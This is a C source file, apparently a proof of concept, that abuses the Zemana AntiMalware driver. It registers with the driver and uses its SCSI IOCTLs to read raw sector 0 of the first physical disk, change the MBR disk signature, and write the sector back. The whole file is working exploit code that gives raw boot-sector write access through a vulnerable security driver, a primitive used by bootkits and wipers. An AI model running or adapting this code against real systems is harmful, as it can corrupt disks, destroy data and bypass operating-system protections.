


#include <Windows.h>
#include <stdio.h>

#pragma pack( push, 1 )
typedef struct _SCSI_ACCESS {
    // PhysicalDrive[X]
    ULONG32 DiskNumber;
    UCHAR   Pad0;

    // SCSI_REQUEST_BLOCK
    UCHAR   PathId;
    UCHAR   TargetId;
    UCHAR   Lun;

    // OffsetHigh must be 0
    // OffsetLow is the sector lba.
    ULONG32 OffsetHigh;
    ULONG32 OffsetLow;

    // Length is truncated when written
    // to the SCSI CDB
    ULONG32 Length;

    // DataTransferLength = Length * Count;
    ULONG32 Count;

    // something to do with protected sectors, when writing.
    //ULONG32 Pad1;
    //ULONG32 SomeFlag;
} SCSI_ACCESS, *PSCSI_ACCESS;
#pragma pack( pop )

BOOL
ScsiDiskSectorAccess(
    _In_ HANDLE  DriverHandle, // 
    _In_ ULONG32 Disk,         // PhysicalDrive[X]
    _In_ ULONG32 LogicalBlock, // lba.
    _In_ PVOID   Buffer,       // buffer should be of size 512, this is where the data is read.
    _In_ BOOL    Write         // if true, write, else read.
)
{
    CHAR         AccessBuffer[ 1024 ];
    PSCSI_ACCESS Access;
    DWORD        ReturnLength;

    Access = ( PSCSI_ACCESS )&AccessBuffer;

    Access->DiskNumber = Disk;

    Access->OffsetHigh = 0;
    Access->OffsetLow = LogicalBlock;
    Access->Count = 512;
    Access->Length = 1;

    Access->Lun = 0;
    Access->TargetId = 0;
    Access->PathId = 0;

    if ( Write ) {
        memcpy( ( void* )( ( char* )Access + 512 ), Buffer, 512 );

        return DeviceIoControl( DriverHandle,
                                0x80002018, // IOCTL_SCSI_WRITE
                                Access,
                                1024,
                                Access,
                                1024,
                                &ReturnLength,
                                NULL );
    }
    else {

        return DeviceIoControl( DriverHandle,
                                0x80002014, // IOCTL_SCSI_READ
                                Access,
                                sizeof( SCSI_ACCESS ),
                                Buffer,
                                512,
                                &ReturnLength,
                                NULL );
    }
}

void main( ) {

    HANDLE DriverHandle;
    CHAR   Sector[ 512 ];
    BOOL   Result;
    DWORD  BufferRegisterProcess;
    DWORD  ReturnLength;

    DriverHandle = CreateFileW( L"\\\\.\\ZemanaAntiMalware",
                                0,
                                0,
                                NULL,
                                OPEN_EXISTING,
                                0,
                                0 );

    if ( DriverHandle == INVALID_HANDLE_VALUE ) {

        printf( "> failed to open a handle to the driver.\n" );
        ExitProcess( 0 );
    }

    printf( "> opened handle to driver: %d.\n", ( int )( ULONG_PTR )DriverHandle );

    BufferRegisterProcess = GetCurrentProcessId( );

    Result = DeviceIoControl( DriverHandle,
                              0x80002010,
                              &BufferRegisterProcess,
                              sizeof( DWORD ),
                              NULL,
                              0,
                              &ReturnLength,
                              NULL );
    if ( !Result ) {

        printf( "> failed to register process with the driver.\n" );
        CloseHandle( DriverHandle );
        ExitProcess( 0 );
    }

    printf( "> registered with the driver.\n" );

    Result = ScsiDiskSectorAccess( DriverHandle,
                                   0,
                                   0,
                                   Sector,
                                   FALSE );

    if ( !Result ) {

        printf( "> scsi access failed.\n" );
        CloseHandle( DriverHandle );
        ExitProcess( 0 );
    }

    printf( "> scsi access successful, unique disk id (assuming mbr): %lx.\n", *( ULONG32* )( Sector + 440 ) );
    ( *( ULONG32* )( Sector + 440 ) )++;

    printf( "> incremented unique disk id, writing back.\n" );

    Result = ScsiDiskSectorAccess( DriverHandle,
                                   0,
                                   0,
                                   Sector,
                                   TRUE );
    if ( !Result ) {

        printf( "> scsi access failed to write back...\n" );
        CloseHandle( DriverHandle );
        ExitProcess( 0 );
    }

    printf( "> successfully written back.\n> done!\n" );

    CloseHandle( DriverHandle );
    ExitProcess( 0 );
}
